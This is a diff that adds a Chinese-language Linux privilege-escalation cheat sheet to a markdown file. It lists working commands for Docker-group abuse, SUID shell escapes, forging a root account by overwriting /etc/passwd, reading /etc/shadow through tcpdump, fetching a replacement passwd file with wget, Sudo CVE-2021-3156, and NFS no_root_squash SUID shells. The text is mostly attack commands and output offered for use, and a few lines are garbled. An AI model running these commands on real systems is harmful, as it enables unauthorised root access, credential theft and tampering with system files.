@@ -203,10 +203,153 @@
 [linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)
 
 
+## Docker提权
+docker组拥有启动docker的权限，此时如果将本地磁盘映射到docker里面并且用容器内的root权限修改，就可以读取宿主机的内容甚至添加拥有sudo权限的用户
+
+>docker run -it –rm -v /etc:/etc ubuntu /bin/bash  
+>adduser test  
+>usermod -aG sudo test
+
+## SUID提权
+SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。
+
+**POC**
+
+>find / -perm -u=s -type f 2>/dev/null
+>find / -user root -perm -4000 -exec ls -ldb {} ;
+>find / -user root -perm -4000 -print 2>/dev/null
+
+### Find
+
+>touch test
+>find test -exec "whoami" \;
+>find test -exec "/bin/bash" \;
+
+### Vi/vim
+
+>vim  
+>:set shell=/bin/sh  
+>:shell
+
+### bash
+
+>bash -p
+>bash-3.2# id
+>uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+
+### less
+
+>less /etc/passwd
+>!/bin/sh
+
+### more
+
+>more /home/pelle/myfile
+>!/bin/bash
+
+### cp
+
+>#覆盖 `/etc/shadow` 或 `/etc/passwd`
+>cat /etc/passwd >passwd
+>openssl passwd -1 -salt hack hack123
+>$1$hack$WTn0dk2QjNeKfl.DHOUue0
+>echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' >> passwd
+>cp passwd /etc/passwd
+>su - hack
+>Password:
+> id
+> uid=0(hack) gid=0(root) groups=0(root)
+> cat /etc/passwd|tail -1
+> hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
+
+### mv
+
+>覆盖 `/etc/shadow` 或 `/etc/passwd`
+
+### awk
+
+>awk 'BEGIN {system("/bin/sh")}'
+
+### man
+
+>man passwd
+>!/bin/bash
+
+### wget
+
+>wget http://192.168.56.1:8080/passwd -O /etc/passwd
+
+### apache
+
+>apache2 -f /etc/shadow
+
+### tcpdump
+
+>echo $'id\ncat /etc/shadow' > /tmp/.test
+>chmod +x /tmp/.test
+>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+### python/perl/ruby/lua/php/etc
+
+>#python
+>python -c "import os;os.system('/bin/bash')"
+>#perl
+>exec "/bin/bash";
+
+[SUID查询手册](https://gtfobins.github.io/#+shell)
+
+## 内核提权
+
+>uname -a
+
+搜索相关内核漏洞，并编译上传
+
+[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
+[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 
 
+## crontab提权
 
+Cron任务常常以root权限运行。如果我们可以成功篡改Cron任务中定义的任何脚本或二进制文件，我们便可以使用root权限执行任意代码。
 
+**POC**
+
+>crontab -lls -alh /var/spool/croncat /etc/cron*
+
+## sudo提权
+
+由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。
+
+影响范围
+
+-   Sudo 1.8.2 - 1.8.31p2
+-   Sudo 1.9.0 - 1.9.5p1
+
+测试系统是否易受此漏洞影响：
+
+1.  以非root用户身份登录系统。
+2.  运行命令“sudoedit -s /”
+3.  如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开的错误响应，则表示该漏洞已被补丁修复。
+利用工具:[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)
+
+## NFS提权
+
+网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。
+
+Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ _nfsnobody_ ”，该用户具有最小的本地权限。如果 no__root_squash_ 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。
+
+查看NFS服务器上的共享目录
+
+>sudo showmount -e 10.1.1.233  
+
+本地挂载目录，使用攻击者本地root权限创建Suid shell。
+ 
+>sudo mkdir -p /tmp/data  
+>sudo mount -t nfs 10.1.1.233:/home/bypass /tmp/data  
+>cp /bin/bash /tmp/data/shell  
+>chmod u+s /tmp/data/shell  
+
+在shell上使用`shell -p`参数获取root权限
 
 
 
